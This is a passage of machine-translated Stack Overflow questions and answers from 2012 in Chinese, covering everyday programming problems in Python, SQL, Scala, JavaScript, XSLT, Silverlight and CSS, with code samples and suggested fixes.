> 时间：2012-04-26T17:32:58.937

[请参阅模块搜索路径](http://docs.python.org/tutorial/modules.html#tut-searchpath)上的文档。你可以加：

```
import sys
sys.path.append("../..") 
```

到 events.py 的开头，或者修改环境变量`PYTHONPATH`。

# visual-studio - 使用 Visual Studio 2003 和 .NET Framework 1.1 连接到 sybase 数据库

> ID：10338384
> 
> 赞同：0
> 
> 时间：2012-04-26T17:26:32.203
> 
> 标签：visual-studio, sap-ase, .net-framework-version

我正在开发我的应用程序（使用 Visual Studio 2003 和 .NET Framework 1.1 构建）和 Sybase 数据库之间的接口。我安装了 Adaptive Server 来存储数据库。当我尝试将需要的 dll 引用到我的项目时出现问题，我有两个无法添加的 dll（Sybase.AdoNet2.AseClient.dll 和 Sybase.AdoNet4.AseClient.dll），并搜索我在那里看到的网络是一个名为“Sybase.Data.AseClient.dll”的 dll，但不知道从哪里得到它。帮助！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T07:13:36.857

这取决于您拥有哪个版本的 Sybase。驱动程序可以与 Sybase 客户端安装一起安装。

你应该有 dll 文件：

1.  sybdrvadoXX.dll（其中 XX 是一个数字）
2.  Sybase.Data.AseClient 或 Sybase.AdoNet2.AseClient

第一个只是扔在 bin 目录中。第二个添加到参考文献中。

祝你好运 ：）

# c# - 当数据库镜像损坏但主体仍然存在时，网站抛出异常

> ID：10338385
> 
> 赞同：1
> 
> 时间：2012-04-26T17:26:34.647
> 
> 标签：c#, asp.net, sql-server, sql-server-2008, mirroring

在紧急情况下，当我们不得不从我们的一个数据库中删除一个损坏的数据库镜像（Sql Server 2008）来重建它时，我们的 c# 网站开始偶尔（不是每个数据库连接）抛出一个异常，上面写着

***System.Data.SqlClient.SqlInternalConnectionTds.LoginWithFailover*函数调用中的**“数据库 X 未配置用于数据库镜像” 。****

 **我明白为什么它会对丢失的镜像不满意，但我希望它停止破坏我的网络请求——如果数据库镜像关闭，我的最终用户不应该受到影响。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-30T20:00:16.383

看起来这是设计使然，但如果您连接到故障转移伙伴，然后关闭镜像，它就会打开。

“如果您指定故障转移伙伴，但故障转移伙伴服务器未配置用于数据库镜像，并且主服务器（使用 Server 关键字指定）不可用，则连接将失败。”

[http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection.connectionstring.aspx](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection.connectionstring.aspx)

不过，希望我能告诉它不要扔……它是镜像设置的一个大问题。**

# sql - Heroku - SQL 查询在 localhost 和 heroku 上返回差异结果

> ID：10338404
> 
> 赞同：1
> 
> 时间：2012-04-26T17:27:53.137
> 
> 标签：sql, postgresql, heroku, intervals

我在表格中有日期列`birthday`，例如。价值`2003-05-01`。在这张表上，我运行以下查询：

```
SELECT "users".* FROM "users" WHERE (users.birthday < current_date - interval '15' year); 
```

在我的本地主机上，`birthday: 2003-05-15`没有返回带有的行（这是正确的），但在 heroku 上它确实如此。

我在本地使用 PostgreSQL 数据库，这就是为什么我不明白，怎么可能在同一个查询上得到两个不同的结果......

有没有人有类似的问题？这种行为可能是什么问题？

谢谢你的每一个建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T20:03:51.987

尝试将“年份”放入值为“15”的字符串中。这是一个长镜头，但可能是 Heroku 默默地删除了“年份”，认为它是一个列别名：

```
db=# select current_date - interval '15' year;
      ?column?       
---------------------
 1997-04-26 00:00:00

db=# select current_date - interval '15'
        years        
---------------------
 2012-04-25 23:59:45

db=# select current_date - interval '15 year';
      ?column?       
---------------------
 1997-04-26 00:00:00 
```

# ruby - 删除除名称之外的所有内容的 Ruby 正则表达式；示例 gem_name (abcd-123)

> ID：10338407
> 
> 赞同：0
> 
> 时间：2012-04-26T17:28:06.957
> 
> 标签：ruby, regex

我正在做一个安装所有 gem 的小脚本，我做到了，但我对此有疑问；

包含 gem 列表的文件如下所示：adapter (0.5.2) do_sqlite3 (0.10.8 x86-mingw32)

和许多其他人。如果我从脚本中读取行，我可以执行 foo.gsub /[^a-zA-Z]/,'' 来删除数字。但随后它从宝石名称中删除了数字，并且我在括号内留下了字母。所以我想要一个删除除 gem 名称之外的所有内容的正则表达式。任何帮助或链接都可以。

肿瘤坏死因子

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:32:03.727

所以，我的第一个问题是关于您安装宝石列表的目标。可能已经有一个工具可以解决您的潜在问题。（[打包机](http://gembundler.com/)？）

但是，一个可能有效的正则表达式是删除括号括起来的字符串部分： `/\([^\)]*\)/`

```
> "adapter (0.5.2) do_sqlite3 (0.10.8 x86-mingw32)".gsub /\([^\)]*\)/, ''
=> "adapter  do_sqlite3 " 
```

# scala - 遍历文件的行

> ID：10338408
> 
> 赞同：7
> 
> 时间：2012-04-26T17:28:11.887
> 
> 标签：scala, io, iterator

我想编写一个简单的函数来遍历文本文件的行。我相信`2.8`一个人可以做到：

```
def lines(filename: String) : Iterator[String] = { 
    scala.io.Source.fromFile(filename).getLines
} 
```

就是这样，但在`2.9`上面不起作用，我必须这样做：

```
def lines(filename: String) : Iterator[String] = { 
    scala.io.Source.fromFile(new File(filename)).getLines()
} 
```

现在，问题是，我想在一个`for`理解中组合上面的迭代器：

```
for ( l1 <- lines("file1.txt"); l2 <- lines("file2.txt") ){ 
    do_stuff(l1, l2) 
} 
```

这又一次，过去可以正常工作，`2.8`但会导致“打开的文件太多”异常被抛出`2.9`。这是可以理解的——理解中的第二个`lines` 最终会为第一行中的每一行打开（而不是关闭）一个文件。

就我而言，我知道它`"file1.txt"`很大，我不想把它吸进
内存，但是第二个文件很小，所以我可以写一个不同的`linesEager` ：

```
def linesEager(filename: String): Iterator[String] = 
    val buf = scala.io.Source.fromFile(new File(filename))
    val zs  = buf.getLines().toList.toIterator
    buf.close()
    zs 
```

然后把我的理解变成：

```
for (l1 <- lines("file1.txt"); l2 <- linesEager("file2.txt")){ 
    do_stuff(l1, l2) 
} 
```

这有效，但显然很难看。有人可以建议一种统一且干净的方式来实现上述目标。似乎您需要一种方法让文件在到达末尾时返回`lines`到`close`文件的迭代器，这一定是发生的，`2.8`这就是它在那里工作的原因？

谢谢！

顺便说一句 - 这是显示问题的完整程序的最小版本：

```
import java.io.PrintWriter
import java.io.File

object Fail { 

  def lines(filename: String) : Iterator[String] = { 
    val f = new File(filename)
    scala.io.Source.fromFile(f).getLines()
  }

  def main(args: Array[String]) = { 
    val smallFile = args(0)
    val bigFile   = args(1)

    println("helloworld")

    for ( w1 <- lines(bigFile)
        ; w2 <- lines(smallFile)
        ) 
    {
      if (w2 == w1){
        val msg = "%s=%s\n".format(w1, w2)
        println("found" + msg)
      }
    }

    println("goodbye")
  }

} 
```

在`2.9.0`我编译时`scalac WordsFail.scala`，我得到了这个：

```
rjhala@goto:$ scalac WordsFail.scala 
rjhala@goto:$ scala Fail passwd words
helloworld
java.io.FileNotFoundException: passwd (Too many open files)
    at java.io.FileInputStream.open(Native Method)
    at java.io.FileInputStream.<init>(FileInputStream.java:120)
    at scala.io.Source$.fromFile(Source.scala:91)
    at scala.io.Source$.fromFile(Source.scala:76)
    at Fail$.lines(WordsFail.scala:8)
    at Fail$$anonfun$main$1.apply(WordsFail.scala:18)
    at Fail$$anonfun$main$1.apply(WordsFail.scala:17)
    at scala.collection.Iterator$class.foreach(Iterator.scala:652)
    at scala.io.BufferedSource$BufferedLineIterator.foreach(BufferedSource.scala:30)
    at Fail$.main(WordsFail.scala:17)
    at Fail.main(WordsFail.scala)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at scala.tools.nsc.util.ScalaClassLoader$$anonfun$run$1.apply(ScalaClassLoader.scala:78)
    at scala.tools.nsc.util.ScalaClassLoader$class.asContext(ScalaClassLoader.scala:24)
    at scala.tools.nsc.util.ScalaClassLoader$URLClassLoader.asContext(ScalaClassLoader.scala:88)
    at scala.tools.nsc.util.ScalaClassLoader$class.run(ScalaClassLoader.scala:78)
    at scala.tools.nsc.util.ScalaClassLoader$URLClassLoader.run(ScalaClassLoader.scala:101)
    at scala.tools.nsc.ObjectRunner$.run(ObjectRunner.scala:33)
    at scala.tools.nsc.ObjectRunner$.runAndCatch(ObjectRunner.scala:40)
    at scala.tools.nsc.MainGenericRunner.runTarget$1(MainGenericRunner.scala:56)
    at scala.tools.nsc.MainGenericRunner.process(MainGenericRunner.scala:80)
    at scala.tools.nsc.MainGenericRunner$.main(MainGenericRunner.scala:89)
    at scala.tools.nsc.MainGenericRunner.main(MainGenericRunner.scala) 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-26T18:50:33.503

[scala-arm](https://github.com/jsuereth/scala-arm)提供了一种很好的机制，可以在您使用完资源后自动关闭它们。

```
import resource._
import scala.io.Source

for (file1 <- managed(Source.fromFile("file1.txt"));
     l1 <- file1.getLines();
     file2 <- managed(Source.fromFile("file2.txt"));
     l2 <- file2.getLines()) {
  do_stuff(l1, l2)
} 
```

但是，除非您在循环时指望`file2.txt`更改的内容`file1.txt`，否则最好在循环`List`之前将其读入 a 中。无需将其转换为`Iterator`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:49:09.390

也许你应该看看 scala-arm (https://github.com/jsuereth/scala-arm) 并让文件的关闭（文件输入流）在后台自动发生。

# jquery - 你能阻止 jquery 循环覆盖内联绝对位置吗？

> ID：10338413
> 
> 赞同：1
> 
> 时间：2012-04-26T17:28:26.323
> 
> 标签：jquery, jquery-cycle

Cycle 用 top:0 left:0 覆盖 div 中图像的位置有没有办法阻止它，所以我可以使用内联定位？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T19:33:00.463

不。你可以循环一些 div，在这些 div 中，你可以在图像上使用任何你需要的内联样式。Jquery Cycle 使用它自己的循环元素定位来制作幻灯片。这是一个例子：

```
<div id="slideshow">
  <div><img src="pic.png" style="margin-left:10px" /></div>
  <div><img src="pic2.png" style="margin-left:10px" /></div>
  <div><img src="pic3.png" style="margin-left:10px" /></div>
  <div><img src="pic4.png" style="margin-left:10px" /></div>
  <div><img src="pic5.png" style="margin-left:10px" /></div>
</div>

$('#slideshow').cycle(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-31T18:25:39.987

您可以为每个内联样式编写一些自定义 css 规则，并附`!important`加到每个值，这将覆盖内联规则。

# javascript - 无法理解添加操作如何在 javascript 中对十进制数起作用

> ID：10338420
> 
> 赞同：0
> 
> 时间：2012-04-26T17:28:51.473
> 
> 标签：javascript

我一直在用 java 编码，最近开始用 javascript 编码（准确地说是 node.js）。让我发疯的一件事是对十进制数进行加法运算；

考虑以下代码

```
var a=0.1, b=0.2, c=0.3;
var op1 = (a+b)+c;
var op2 = (b+c)+a; 
```

令我惊讶的是，我发现了`op1 != op2`！console.logging op1 和 op2 打印出以下内容：

```
console.log(op1); 0.6000000000000001
console.log(op2); 0.6 
```

这根本不符合逻辑。这对我来说似乎是一个错误，因为 javascript 根本无法忽略算术规则。有人可以解释为什么会这样吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:39:48.923

这是浮点错误的情况。

唯一可以用浮点数精确表示的分数是那些可以写成整数分数的分数，分母是 2 的幂。

例如，0.5 可以精确表示，因为它可以写成 1/2。0.3 不能。

在这种情况下，变量和表达式中的舍入误差恰好结合在一起，在第一种情况下会产生错误，但在第二种情况下不会。

这两种方式都没有在幕后准确表示，但是当您输出值时，它会将其四舍五入为 16 位精度。在一种情况下，它四舍五入到一个稍大的数字，而在另一种情况下，它四舍五入到预期值。

您应该吸取的教训是，**您永远不应该依赖具有精确值的浮点数**，尤其是在进行一些算术运算之后。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:48:42.350

这不是 javascript 问题，而是使用浮点数时每种编程语言的标准问题。您的样本数 0.1、0.2 和 0.3 不能表示为有限小数，而是重复小数，因为它们中有除数 5：0.1 = 1/(2*5) 等等。如果您只使用除数为 2 的小数（如 a=0.5、b=0.25 和 c=0.125），一切都很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:55:20.307

发生这种情况是因为[并非所有浮点数都可以用二进制准确表示](http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html)。

将所有数字乘以某个数字（例如，如果您处理 2 个小数点，则为 100）。

然后对较大的结果进行算术运算。

算术完成后，除以开始时乘以的相同因子。

[http://jsfiddle.net/SjU9d/](http://jsfiddle.net/SjU9d/)

```
a = 10 * a;
b = 10 * b;
c = 10 * c;

op1 = (a+b)+c;
op2 = (b+c)+a;

op1 = op1 / 10;
op2 = op2 / 10; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T18:21:25.717

使用浮点数时，您可能希望在比较之前设置数字的精度。

```
(0.1 + 0.2).toFixed(1) == 0.3 
```

但是，在少数情况下，toFixed 在浏览器中的行为方式不同。这是对 toFixed 的修复。

[http://bateru.com/news/2012/03/reimplementation-of-number-prototype-tofixed/](http://bateru.com/news/2012/03/reimplementation-of-number-prototype-tofixed/)

# jakarta-ee - 哪个是最好的 JPA L2 缓存提供商？

> ID：10338431
> 
> 赞同：0
> 
> 时间：2012-04-26T17:29:11.197
> 
> 标签：jakarta-ee, jpa, memcached, ehcache

这引用了我之前提出的一个问题：[Scaling and Clustering JPA](https://stackoverflow.com/questions/10328581/scaling-and-clustering-jpa)。在使用 JPA 缓存时，似乎有很多选择。我倾向于 memcached，因为它似乎有广泛的支持，包括 Java 环境之外的支持。我过去在 JPA 之外使用过 ehcache 并且很喜欢它。我的限制是我在使用 MySQL Cluster 作为后备存储的 JBoss 7 上。我们的 JPA 提供者目前是 Hibernate，但如果有一个健壮的提供者，相对于分布式缓存而言易于使用，我们愿意进行更改。我的选择似乎是：

*   内存缓存
*   缓存
*   JBoss 缓存
*   顶联网格

我很想听到让我选择的合格答案。

感谢您的见解。

-拉吉

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:21:59.897

Ehcache 还可以 - 可靠的项目。JBoss Cache 性能存在（有？）问题 [http://stackoverflow.com/questions/6346357/performance-of-jboss-cache-and-ehcache]。我会将 infinispan 添加到列表中（也由 JBoss 人员添加），但我从未使用过它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-02T20:09:01.837

你可以试试 Hazelcast。它提供开箱即用的 Hibernate 2 级缓存。有关更多信息，请参阅[http://hazelcast.com/docs/2.1/manual/single_html/#HibernateSecondLevelCache](http://hazelcast.com/docs/2.1/manual/single_html/#HibernateSecondLevelCache)

注意：我为 Hazelcast 工作

# xslt-1.0 - 如何在特定父节点中选择前面的节点

> ID：10338433
> 
> 赞同：1
> 
> 时间：2012-04-26T17:29:18.100
> 
> 标签：xslt-1.0

给定以下 xml

```
 <Root>
 <Employee>
   <service>
     <Record>xxx</Record>
     <Record>yyy</Record>
   </service>
   <service>
    <Record>xxx</Record>
    <Record>yyy</Record>
    <Record>zzz</Record>
   </service>
</Employee>
<Employee>
  <service>
     <Record>xxx</Record>
     <Record>yyy</Record>
   </service>
   <service>
    <Record>xxx</Record>
    <Record>yyy</Record>
    <Record>zzz</Record>
   </service>
</Employee>
</Root> 
```

使用 XSLT1.0，在为每个包含 'xxx'、'yyy'、'zzz'`<Employee>`的`<Record>`字段转换 xml 时，结果中应该只出现一次

```
<Root>
 <Employee>
    <Service>
     <Record>xxx</Record>
     <Record>yyy</Record>
     <Record>zzz</Record>
   </Service>
</Employee>
<Employee> 
  <Service>
  <Record>xxx</Record>
  <Record>yyy</Record>
  <Record>zzz</Record>
 <Service>
</Employee>
</Root> 
```

在 Employee 的 for-each 循环中，我厌倦了使用`<xsl:if test='not(preceding::./service/Record=$record)'>`. 该测试适用于第一次`<Employee>`参加`<Record>`for 'xxx','yyy','zzz' 一次。当迭代进入下一个`<Employee>`时，测试条件也会检查第一个中的`<Record>`值，`<Employee>`它发现前面的节点已经存在值'xxx'，'yyy'，'zzz'，因此我无法获取记录第二个`<Employee>`。如何获得`<Record>`第二个中的 s `<Employee>`。任何帮助深表感谢。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T12:56:53.023

**此转换使用 Muenchian 方法进行分组**：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:key name="kEmpRecordByVal" match="Employee/service/Record"
  use="concat(generate-id(../..), '+', .)"/>

 <xsl:template match="node()|@*">
     <xsl:copy>
       <xsl:apply-templates select="node()|@*"/>
     </xsl:copy>
 </xsl:template>

 <xsl:template match="Employee">
  <Employee>
    <xsl:apply-templates select=
     "service/Record
           [generate-id()
           =
            generate-id(key('kEmpRecordByVal',
                            concat(generate-id(../..), '+', .)
                            )[1]
                        )
           ]
     "/>
  </Employee>
 </xsl:template>
</xsl:stylesheet> 
```

**当应用于以下 XML 文档时**（为第二个提供了不同的值`Employee`以提高可读性）：

```
<Root>
    <Employee>
        <service>
            <Record>xxx</Record>
            <Record>yyy</Record>
        </service>
        <service>
            <Record>xxx</Record>
            <Record>yyy</Record>
            <Record>zzz</Record>
        </service>
    </Employee>
    <Employee>
        <service>
            <Record>aaa</Record>
            <Record>bbb</Record>
        </service>
        <service>
            <Record>aaa</Record>
            <Record>bbb</Record>
            <Record>ccc</Record>
        </service>
    </Employee>
</Root> 
```

**产生了想要的正确结果：**

```
<Root>
   <Employee>
      <Record>xxx</Record>
      <Record>yyy</Record>
      <Record>zzz</Record>
   </Employee>
   <Employee>
      <Record>aaa</Record>
      <Record>bbb</Record>
      <Record>ccc</Record>
   </Employee>
</Root> 
```

# sql-server-2008 - 如何将作为午夜 (00) 的军用时间的 DATEPART 小时转换为我需要计算时可以使用的值？

> ID：10338436
> 
> 赞同：1
> 
> 时间：2012-04-26T17:29:30.063
> 
> 标签：sql-server-2008, tsql, datepart

我有我正在写入存储过程的代码：

```
declare @StartTime time
declare @EndTime time
declare @Temp_StartTime time

declare @temp_StartHour int
declare @temp_EndHour int
declare @temp_StartMinute int
declare @temp_EndMinute int

SET @StartTime='22:30:00'
SET @EndTime='00:52:00'
SET @Temp_StartTime=@StartTime

SET @temp_StartHour=DATEPART(HOUR, @StartTime)
SET @temp_EndHour=DATEPART(HOUR, @EndTime)
SET @temp_StartMinute=DATEPART(MI, @StartTime)
SET @temp_EndMinute=DATEPART(MI, @EndTime)

if(@temp_EndMinute>0)
    BEGIN
        SET @temp_EndHour=@temp_EndHour+1
    END

DECLARE @Temp_Table TABLE
(
  StartHour int,
  StartMinute int,
  EndHour int,
  EndMinute int,
  StartTime time,
  EndTime time
)

WHile((@temp_EndHour-@temp_StartHour>=1))
    BEGIN
        INSERT INTO @Temp_Table
        SELECT (DATEPART(HOUR, @Temp_StartTime)) AS StartHour,(DATEPART(MINUTE, @Temp_StartTime)) AS StartMinute,
        @temp_StartHour+1 AS EndHour, 
        0 AS EndMinute, @StartTime as StartTime, @EndTime as EndTime

        SET @temp_StartHour=@temp_StartHour+1
        SET @Temp_StartTime=DATEADD(HOUR,1,@Temp_StartTime)

        if(DATEPART(MI, @Temp_StartTime)!=0)
            BEGIN
                SET @Temp_StartTime=DATEADD(MI,-@temp_StartMinute,@Temp_StartTime)
            END
    END

SELECT * FROM @Temp_Table 
```

如果您使用除我在上面的 00:52:00 示例之外的任何时间值，它会非常有用。例如，如果 EndTime 是 23:05，则存储过程运行良好。我对 DATEPART 进行了一些研究，但没有发现任何有用的信息来帮助它正确计算军用时间的午夜。

编辑：当代码正常运行时，它会计算开始时间和结束时间之间的时间间隔，想法是将每小时的新行存储到临时表中（最终这将被保存到新表中以进行跟踪按小时停电）。当我在 21:30 到 22:15 运行它时，它会起作用。我得到两行反映 21:00 到 22:00 和 22:00 到 23:00（这是我想要的逻辑）。但是在那里扔军事午夜，我没有返回任何行，因为 calc 不会计算 00。

我在我的数据库中找到了显示开始时间为 22:00:0000 和结束时间为 00:00:00.0000000 的示例，反之亦然。因此，一种方法将计算，其中开始时间为 00，但如果开始时间为 21:00:0000，结束时间为 00:52:0000，则没有骰子。我没有返回任何行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T05:57:59.513

如果我没有遗漏任何东西，这就是你可以尝试的，而不是你的循环：

```
DECLARE
  @StartTime time,
  @EndTime   time;

SET @StartTime = '22:30:00';
SET @EndTime   = '00:52:00';

WITH timerange AS (
  SELECT
    StartTime = CAST(@StartTime AS datetime),
    EndTime   = DATEADD(
      DAY,
      CASE WHEN @StartTime > @EndTime THEN 1 ELSE 0 END,
      CAST(@EndTime AS datetime)
    )
),
hourly AS (
  SELECT
    n.number,
    t.StartTime,
    t.EndTime,
    HStart = DATEADD(HOUR, DATEDIFF(HOUR, 0, t.StartTime) + n.number    , 0),
    HEnd   = DATEADD(HOUR, DATEDIFF(HOUR, 0, t.StartTime) + n.number + 1, 0)
  FROM timerange t
    INNER JOIN master..spt_values n
      ON n.number BETWEEN 0 AND DATEDIFF(HOUR, t.StartTime, t.EndTime)
  WHERE n.type = 'P'
),
hourly2 AS (
  SELECT
    number,
    HStart = CASE WHEN StartTime > HStart THEN StartTime ELSE HStart END,
    HEnd   = CASE WHEN EndTime   < HEnd   THEN EndTime   ELSE HEnd   END
  FROM hourly
)
SELECT
  StartHour   = DATEPART(HOUR  , HStart),
  StartMinute = DATEPART(MINUTE, HStart),
  EndHour     = DATEPART(HOUR  , HEnd  ),
  EndMinute   = DATEPART(MINUTE, HEnd  ),
  StartTime   = CAST(HStart AS time),
  EndTime     = CAST(HEnd   AS time)
FROM hourly2
ORDER BY number
; 
```

产生的输出是这样的：

```
StartHour   StartMinute EndHour     EndMinute   StartTime        EndTime
----------- ----------- ----------- ----------- ---------------- ----------------
22          30          23          0           22:30:00.0000000 23:00:00.0000000
23          0           0           0           23:00:00.0000000 00:00:00.0000000
0           0           0           52          00:00:00.0000000 00:52:00.0000000 
```

# silverlight - 从 Silverlight 访问 Rally SOAP 服务

> ID：10338438
> 
> 赞同：0
> 
> 时间：2012-04-26T17:29:38.053
> 
> 标签：silverlight, rally

是否可以从 Silverlight 访问 Rally 的 SOAP 服务？我能够从桌面应用程序中的 .NET 2.0 代理访问该服务，但不能通过 Silverlight 中的 WCF 客户端代理。我得到以下熟悉的异常，

> System.ServiceModel.CommunicationException：尝试向 URI 发出请求时发生错误 ...。这可能是由于尝试以跨域方式访问服务而没有适当的跨域策略或策略这不适用于 SOAP 服务。您可能需要联系服务的所有者以发布跨域策略文件并确保它允许发送与 SOAP 相关的 HTTP 标头。此错误也可能是由于在 Web 服务代理中使用内部类型而不使用 InternalsVisibleToAttribute 属性造成的。有关更多详细信息，请参阅内部异常。

我认为问题是由于尝试从 Silverlight 发出跨域请求引起的，这需要在服务器上安装跨域策略文件。如果是这种情况，为什么桌面应用程序不需要这样的策略？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:32:17.200

我不是 Silverlight 专家，但这看起来像是 Silverlight 实施的跨域脚本/安全沙箱，以确保 Silverlight 客户端不会向下载它们的服务器/主机以外的站点发出请求，除非Silverlight 客户端由服务提供商/开发人员专门授予该权利。在上面的错误消息中：

“您可能需要联系服务所有者发布跨域策略文件，并确保它允许发送与 SOAP 相关的 HTTP 标头。”

我认为“服务所有者”是指 Silverlight 主机的所有者，而不是“外部”网络服务（在本例中为 Rally）。

桌面和/或控制台应用程序不会有相同的沙盒限制。尝试通过 Silverlight 客户端访问其他供应商的 Web 服务时，您可能会遇到同样的问题。

您可能会发现这个 Silverlight 特定的线程：

[跨域策略](https://stackoverflow.com/questions/2848608/cross-domain-policy)

对于如何在您的服务器上设置和配置 Silverlight 跨域策略文件的细节很有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T00:16:48.823

通过使用 Silverlight 5 中提供的扩展权限功能我自己解决了这个问题。由于 xap 部署在内部 Internet 上，因此该解决方案是可以接受的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T19:38:22.637

Silverlight 的构建考虑了安全性。这意味着默认情况下，Silverlight 应用程序中的跨站点脚本是关闭的，并且必须根据具体情况启用。另一方面，.NET 桌面应用程序通常具有更高的安全权限，并且可以调用它喜欢的任何 Web 服务、COM 对象和本机 API。

在 Silverlight 中解决此问题的方法是在服务器上创建服务。Silverlight 客户端代码调用您的服务器端服务，该服务又调用第三方 Web 服务。服务器端服务可以押注 .NET、java 等等。Web 服务器通常可以调用它们喜欢的任何东西——问题已解决。

# java - 我正在黑莓模拟器中将图像写入 SD 卡，如何清除它以进行测试？

> ID：10338439
> 
> 赞同：0
> 
> 时间：2012-04-26T17:29:40.453
> 
> 标签：java, image, blackberry, sd-card

我通常按​​“干净”，它会删除所有持久数据，但图像文件根本没有改变。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:45:54.143

clean.bat 需要很长时间才能执行。只需删除模拟器文件夹中的所有 *.dmp 文件。它将清除所有持久存储数据，包括 sdcard。它将保留所有已安装的 cod 文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:55:55.820

如果您使用的是 Eclipse，请尝试以下步骤：

> *   在**运行**菜单上，单击**运行配置**。
> *   在**模拟器**选项卡中选中“启动时清除 SD 卡”。

![模拟器选项卡](../Images/af122001d39e8637f1c2c5e86d7e7c31.png)

# java - 如何为我的jsp页面赋予动态特性？

> ID：10338442
> 
> 赞同：0
> 
> 时间：2012-04-26T17:29:59.553
> 
> 标签：java, jsp

我知道这个问题很蹩脚。答案很简单——AJAX（我想，我不确定）。但在继续之前，我想知道是否有更好的方法。

我的问题：

我有一个 Web 应用程序，它接收用户的一条语句，然后作为响应，发回另一条语句。整个过程是这样进行的。那么我怎样才能给我的 JSP 赋予动态特性呢？如果我继续重新加载 JSP，我的旧响应将被删除。所以，这不是它的工作方式。

我可以使用`RequestDispatcher`' 的`include()`方法。我认为这是一种解决方案。因此，我可以继续将新页面包含到我的旧 JSP 中。但同样，我认为这将有一个限制。虽然还没有测试过。

有没有更好的方法？

谢谢你的帮助。:-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:36:08.340

我爱上了使用 Restful Webservices 的 AJAX，所以这就是我的建议。此外，如果我对您的理解正确，我认为`include()`在这种情况下不会对您有所帮助，除非您设法在 1 个开放连接中保持流式传输您的响应，这在大多数网页场景中并不理想。

# html - Facebook 喜欢 div 下方的按钮偏移，即使没有边距或填充

> ID：10338448
> 
> 赞同：0
> 
> 时间：2012-04-26T17:30:10.917
> 
> 标签：html, css, facebook, facebook-like, facebook-likebox

正如您从下面的示例中看到的那样，Facebook 点赞按钮应该出现在日期和文章开头之间的空白处，但由于我无法弄清楚的未知原因，它却向下移动了。我敢肯定这是一些晦涩难懂的 CSS 东西，但感谢您提供任何帮助。谢谢！:-)

这是实际页面：[http ://readabout.me/achievements/Reinhardt-University-s-Morgan-Sparks-Selected-for-Who-s-Who-Among-Students-in-American-Universities-and-Colleges/ 3638644](http://readabout.me/achievements/Reinhardt-University-s-Morgan-Sparks-Selected-for-Who-s-Who-Among-Students-in-American-Universities-and-Colleges/3638644)

![示例](../Images/7727df3d9e41540b4882eec13f38a231.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:38:41.853

删除 news.css 文件中的第 30 行：

```
#news-story iframe.fb_ltr {margin:25px 0 10px 0;} 
```

您明确地为喜欢按钮 iframe 提供了 25px 的上边距。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:02:00.077

我发现了问题

请删除边距#news-story iframe.fb_ltr

[http://readabout.me/stylesheets/news.css](http://readabout.me/stylesheets/news.css) 第 30 行 - 并在“#fbLikeButton”问题上设置填充顶部将得到解决

[我可以在 firebugg 上解决这个问题，这是打印屏幕](http://i.stack.imgur.com/IuKqJ.gif)；

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T17:35:17.143

我认为这将解决您的问题:)

```
<div id="fbLikeButton" style="height: 50px; "> 
```

编辑：我认为@cpilko 已经找到了确切的原因，尽管我相信 news.css 不是你的，而是 facebook 的，在这种情况下，你可以尝试将以下代码添加到你的 css 中。

```
#news-story iframe.fb_ltr {
 margin: 0 !important;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T18:18:31.627

只需在 like 按钮中添加一个 height 属性 -`#fbLikeButton{height:60px;}`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-26T19:50:37.690

这行得通。谢谢大家！

```
-#news-story iframe.fb_ltr {margin:25px 0 10px 0;}
+
+div#fbLikeButton {
+    margin-top: 10px;
+    margin-bottom: 10px;
+} 
```

基本上，我删除了内部样式并设置了周围 div 的样式。我没有意识到我们有像按钮 iFrame 这样的 Facebook 内部实际样式的代码。

# jax-rs - 覆盖 jboss 服务器中的默认 Jackson 提供程序

> ID：10338453
> 
> 赞同：2
> 
> 时间：2012-04-26T17:30:42.127
> 
> 标签：jax-rs, jackson, jboss7.x

我正在尝试自定义默认 Jackson 提供程序的行为。我写了如下代码，放到了war包里，但是还是不行。我正在使用 JBoss 版本 7.1.1.Final。

```
@javax.ws.rs.ext.Provider
@javax.ws.rs.Consumes({MediaType.APPLICATION_JSON, "text/json"})
@javax.ws.rs.Produces({MediaType.APPLICATION_JSON, "text/json"})
public class JacksonConfigurator extends JacksonJsonProvider {

